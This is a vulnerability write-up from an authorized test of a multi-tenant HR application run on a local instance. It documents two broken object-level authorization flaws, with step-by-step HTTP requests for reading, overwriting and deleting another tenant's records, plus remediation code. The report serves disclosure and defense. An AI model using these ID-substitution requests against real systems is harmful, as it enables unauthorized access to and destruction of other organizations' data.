# Cross-Tenant IDOR (Broken Object-Level Authorization) — Sevendyne HRMS

| | |
|---|---|
| **Target** | Sevendyne HRMS |
| **Vulnerability Class** | IDOR / Broken Object-Level Authorization (CWE-639) |
| **Tested On** | 2026-09-03 |
| **Overall Severity** | High |
| **Author** | Dinesh |

> **Disclosure note:** This write-up describes findings identified during an authorized security assessment. Replace or redact any client/vendor-identifying details below if you have not received explicit permission to publish them publicly.

---

## Table of Contents
- [Summary](#summary)
- [Test Accounts](#test-accounts)
- [Finding 1 — Cross-Tenant Company Read/Write](#finding-1--cross-tenant-company-readwrite-via-companyid-and-companyeditid)
- [Finding 2 — Cross-Tenant Employee Deletion & Ownership Takeover](#finding-2--cross-tenant-employee-deletion--ownership-takeover-via-appemployeedelete-employeeid)
- [Root Cause Analysis](#root-cause-analysis)
- [Remediation Summary](#remediation-summary)

---

## Summary

Sevendyne HRMS is a multi-tenant application in which each client account belongs to a "company" (tenant). Two endpoints were found to fetch objects by primary key alone, without verifying that the object belongs to the requesting tenant. This allowed any authenticated client — including a freshly self-registered, unprivileged account — to read, modify, and delete data belonging to **other tenants** on the platform.

| # | Finding | Endpoint(s) | Impact | CVSS 3.1 |
|---|---------|-------------|--------|----------|
| 1 | Cross-tenant company read & write | `GET/POST /company/<id>/`, `/company/edit/<id>/` | Read & overwrite any tenant's company profile | 8.1 (High) |
| 2 | Cross-tenant employee deletion + ownership takeover | `GET /app/employee/delete-employee/<id>/` | Delete any tenant's employees and reassign records to attacker | 8.1 (High) |

Both issues share a single root cause (see [Root Cause Analysis](#root-cause-analysis)) and are trivially exploitable — the attacker only needs a valid, unprivileged session and the target object's ID.

---

## Test Accounts

| Role | Account | Company | Company ID |
|------|---------|---------|------------|
| Attacker (Tenant B) | `dastcompanyB` — standard, self-registered HRMS Client, no special role | DAST Tenant B | `52b9eee0-1a15-40b3-9c1a-bcf0d7e224ee` |
| Victim (Tenant A) | — | Sevendyne Demo Corp | `57da000d-98a7-40ab-b792-ef941f2d10c4` |

The attacker never authenticates as, or steals credentials from, the victim tenant. The only variable manipulated across every request below is the **object ID in the URL**, using the attacker's own valid session.

---

## Finding 1 — Cross-Tenant Company Read/Write via `/company/<id>/` and `/company/edit/<id>/`

### Description
The company view and edit endpoints resolve the `Company` object by ID alone, with no check that it belongs to the requesting tenant. Any authenticated client can read and overwrite another tenant's company profile by substituting the victim's company ID into the URL.

### Severity
**High** — CVSS 3.1: `8.1` (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)

### Steps to Reproduce

**1. Read another tenant's company**

```http
GET /company/57da000d-98a7-40ab-b792-ef941f2d10c4/ HTTP/1.1
Host: localhost:8000
Cookie: sessionid=<attacker session>
```

**Result:** `HTTP 200` — returns Tenant A's private data:

```
name        = "Sevendyne Demo Corp"
contact     = "Demo Admin"
address     = "123 Demo Street"
email       = "demo@sevendyne.com"
```

**2. Write (modify) another tenant's company**

```http
POST /company/edit/57da000d-98a7-40ab-b792-ef941f2d10c4/ HTTP/1.1
Host: localhost:8000
Cookie: sessionid=<attacker session>
Content-Type: application/x-www-form-urlencoded

csrfmiddlewaretoken=<token>&name=Sevendyne Demo Corp&contact_person=Demo Admin
[DAST-IDOR-PROOF-VIA-COMPANY-B]&address=123 Demo Street&country=1&state=1
&city=Demo City&postal_code=10001&email=demo@sevendyne.com&phone=+1234567890
```

**Result:** `HTTP 200`

```json
{"status":"true","message":"Company updated successfully."}
```

**3. Verification** — Tenant A's `contact_person` field now reads `Demo Admin [DAST-IDOR-PROOF-VIA-COMPANY-B]`, confirming the attacker (Tenant B) successfully modified another tenant's record.

| | Expected | Actual |
|---|----------|--------|
| Response | `403 Forbidden` / `404 Not Found` | `200 OK` — data returned and modified |

### Impact
Because the same missing check applies to every `Company` record, **all tenants** on the platform are affected, not a single victim. An attacker with only a free client account can enumerate and read every tenant's contact person, address, email, and phone number, and silently overwrite any of it.

### Remediation
Scope every lookup to the requester's tenant:

```python
company = get_object_or_404(Company, pk=pk, id=current_company.id, is_deleted=False)
```

Apply this to **both** the read (`GET`) and write (`POST`) paths, and add an automated authorization test asserting that Tenant B cannot access Tenant A's company ID.

---

## Finding 2 — Cross-Tenant Employee Deletion & Ownership Takeover via `/app/employee/delete-employee/<id>/`

### Description
The employee-delete endpoint retrieves the target `Employee` by primary key only, with no filter tying it to the requester's company. An authenticated client can soft-delete an employee belonging to a **different tenant** — and the same operation reassigns the deleted record's ownership to the attacker's own company, so the attacker both destroys the victim's data and takes ownership of it. The endpoint also accepts a plain `GET` request with no CSRF token.

### Severity
**High** — CVSS 3.1: `8.1` (`AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:H`)

### Steps to Reproduce

Attacker session: logged in as `dastcompanyB` (company `52b9eee0-...`).
Target employee (Tenant A): `8c15a176-58af-489a-8a82-70ccef72121f`.

**1. Send a plain `GET` request — no CSRF token required:**

```http
GET /app/employee/delete-employee/8c15a176-58af-489a-8a82-70ccef72121f/ HTTP/1.1
Host: localhost:8000
Cookie: sessionid=<attacker session>
```

**Result:** `HTTP 200`

```json
{"status":"true","title":"Successfully Deleted","message":"Employee Successfully Deleted."}
```

<!-- 📷 Screenshot 1: request/response above showing the successful cross-tenant delete
     ![Cross-tenant delete request and 200 response](images/finding2-delete-request.png) -->

**2. Verification** — the target employee's `company` field flips from Tenant A (`57da000d-98a7-40ab-b792-ef941f2d10c4`) to the attacker's company, **DAST Tenant B** (`52b9eee0-1a15-40b3-9c1a-bcf0d7e224ee`), and the record is marked deleted.

<!-- 📷 Screenshot 2: database/admin view confirming the record's company field
     reassigned to the attacker's tenant and `is_deleted = true`
     ![Employee record reassigned and marked deleted](images/finding2-record-reassigned.png) -->

| | Expected | Actual |
|---|----------|--------|
| Response | `403 Forbidden` / `404 Not Found`, no modification | `200 OK` — victim's employee deleted and reassigned |

### Impact
An attacker with only a standard client account can destroy another tenant's employee records **and** simultaneously reassign them to their own company — a cross-tenant integrity and availability breach affecting every tenant. Because the endpoint accepts `GET` with no CSRF protection, the deletion can also be triggered against a logged-in victim via a simple cross-site link or `<img>` tag (CSRF).

### Remediation
1. Scope the lookup to the requester's company:
   ```python
   employee = get_object_or_404(Employee, pk=pk, company=current_company, is_deleted=False)
   ```
2. Never reassign an object's tenant/company as a side effect of delete.
3. Require `POST` for this and every other state-changing endpoint (`@require_POST`) and enforce CSRF protection.
4. Add a cross-tenant authorization test proving Tenant B cannot delete Tenant A's employee.

---

## Root Cause Analysis

Both findings share the same underlying flaw: objects are fetched **by primary key alone**, and the authorization layer only verifies that the requesting user *has a current company* — never that the **specific object requested belongs to that company**. A single fix pattern (a tenant-scoped queryset applied consistently across every object-access endpoint) resolves both issues and prevents this class of bug from recurring elsewhere in the codebase.

## Remediation Summary

| Recommendation | Applies To |
|---|---|
| Scope every `get_object_or_404` / queryset lookup with `company=current_company` | All object-access endpoints |
| Never mutate an object's tenant/ownership field as a delete side effect | Employee delete, and any similar "soft delete" flows |
| Require `POST` + CSRF protection for all state-changing routes | Employee delete and any other `GET`-triggered mutation |
| Add automated cross-tenant authorization tests (Tenant B → Tenant A object IDs) | CI regression suite |

---

*Write-up prepared for portfolio/reference purposes. Testing was performed against a local instance (`localhost:8000`) with authorization.*
